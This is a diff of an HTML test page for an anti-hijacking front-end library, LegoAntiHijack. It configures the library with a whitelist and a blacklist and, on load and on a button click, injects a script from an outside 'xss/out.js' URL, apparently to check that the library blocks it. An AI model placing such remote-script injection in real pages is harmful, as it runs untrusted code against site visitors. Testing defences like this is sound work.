@@ -54,25 +54,31 @@
 
     </script>
     <!-- <script src="https://s1.yy.com/ued_web_static/lib/error-report/index.min.js"></script> -->
-    <!-- <script src="./assets/index.js" charset="utf-8"></script> -->
-    <script src="./js/index.js" charset="utf-8"></script>
+    <script src="./assets/index.min.js" charset="utf-8"></script>
+    <!-- <script src="./js/index.js" charset="utf-8"></script> -->
 
     <script>
         var el = document.createElement('script');
-            el.src = 'http://www.etherdream.com/xss/out.js';
-            // el.setAttribute('src', 'http://www.etherdream.com/xss/out.js');
+            // el.src = 'http://www.etherdream.com/xss/out.js';
+            el.setAttribute('src', 'http://www.etherdream.com/xss/out.js');
             document.body.appendChild(el);
     </script>
 
     <script>
-        // new LegoAntiHijack({
-        //     whiteList: ['yy.com'],
-        //     blackList: ['51.la','61.160.200.252',],
-        //     reportUrl: 'http://s1.yy.com/ued_web_static/common/img/blank.png'
-        // });
+        var jjj = new LegoAntiHijack({
+            whiteList: ['yy.com'],
+            blackList: ['51.la','61.160.200.252',]
+            // reportUrl: 'http://s1.yy.com/ued_web_static/common/img/blank.png'
+        });
+
+        console.log(jjj);
 
         document.querySelector('#btn1').addEventListener('click', function(){
-            document.write('<script src="http://s1.yy.com/ued_web_static/project/yy8/hot/1.0.4/assets/h5player-hls.min.js"><\/script>');
+            // document.write('<script src="http://s1.yy.com/ued_web_static/project/yy8/hot/1.0.4/assets/h5player-hls.min.js"><\/script>');
+            var el = document.createElement('script');
+            el.src = 'http://www.etherdream.com/xss/out.js';
+            // el.setAttribute('src', 'http://www.etherdream.com/xss/out.js');
+            document.body.appendChild(el);
         }, false);
 
         document.querySelector('#btn2').addEventListener('click', function(){
